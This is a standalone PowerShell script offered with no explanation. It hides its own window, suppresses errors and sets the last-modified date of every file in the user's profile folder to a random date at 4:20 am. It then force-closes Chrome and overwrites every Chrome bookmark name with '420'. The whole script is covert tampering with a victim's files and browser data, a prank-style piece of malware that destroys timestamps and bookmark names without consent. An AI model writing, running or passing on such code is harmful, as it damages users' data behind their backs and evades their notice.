$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

$ErrorActionPreference = 'SilentlyContinue'

$Directory = "$($env:USERPROFILE)\*"

Get-ChildItem $Directory -Recurse -Exclude Appdata | Sort-Object -Property FullName | ForEach-Object {

$rand1 = get-random -minimum 1 -maximum 28
$rand2 = get-random -minimum 1 -maximum 12
$rand3 = get-random -minimum 1981 -maximum 2107

    $_.LastWriteTime = "$rand1/$rand2/$rand3 4:20 am"
}

$Directory2 = "$($env:USERPROFILE)"

Get-Process Chrome -ErrorAction SilentlyContinue | Stop-Process -Force

Rename-Item -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" -NewName "Bookmarks.json"

((Get-Content -path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json") -replace '(?<="name": ").*?(?=")', '420') | Set-Content -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json"

Rename-Item -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json" -NewName "Bookmarks"
